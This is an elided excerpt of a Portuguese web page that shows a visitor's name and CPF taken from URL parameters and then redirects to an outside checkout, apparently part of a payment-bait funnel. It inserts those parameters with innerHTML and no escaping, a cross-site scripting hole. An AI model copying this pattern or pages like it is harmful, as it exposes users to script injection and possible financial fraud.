...
<body class="">
    <div id="site" tyle="white-space: normal;">
        ...
        <div id="b_1225979_1_1736606248678282284c5df" class="gpc-b" style="white-space: normal;">
            ...
            <div class="centralizar">
                ...
                <div id="e_1225979_1_60477_m" class="gpc-e e_texto dm dm e_1225979_1_60477"
                    ...
                    <div class="c e_texto" style="white-space: normal;"><br>
                        <p><span id="nomeDisplay"><br>Nome não disponível</span></p>
                    </div>
                </div>
        ...
        <script>
            document.addEventListener("DOMContentLoaded", function () {
                ...
                const nome = urlParams.get("nome") ? decodeURIComponent(urlParams.get("nome")) : "Nome não disponível";
                const cpf = urlParams.get("cpf") ? urlParams.get("cpf") : "CPF não disponível";
                const dataAtual = urlParams.get("data_atual") ? urlParams.get("data_atual") : "Data Indisponível";

                document.getElementById('nomeDisplay').innerHTML = "<br>" + nome;
                document.getElementById('cpfDisplay').innerHTML = "<br>" + cpf;
                document.getElementById('nomeCompleto').innerText = nome;
                ...
                if (dataAtual !== "Data Indisponível") {
                    dataRecebimento.innerText = dataAtual;
                } else {
                    const hoje = new Date();
                    const dia = String(hoje.getDate()).padStart(2, '0');
                    const mes = String(hoje.getMonth() + 1).padStart(2, '0');
                    const ano = hoje.getFullYear();
                    dataRecebimento.innerText = `${dia}/${mes}/${ano}`;
                }
            });
    ...
    <script>
        function redirectCheckout(event) {
            ...
            const finalUrl = "https://pay.marketplacetransacaosegura.com/checkout/aa2c2a2e-8026-4f0f-be44-b11d6fe9f332?" + currentParams.toString();
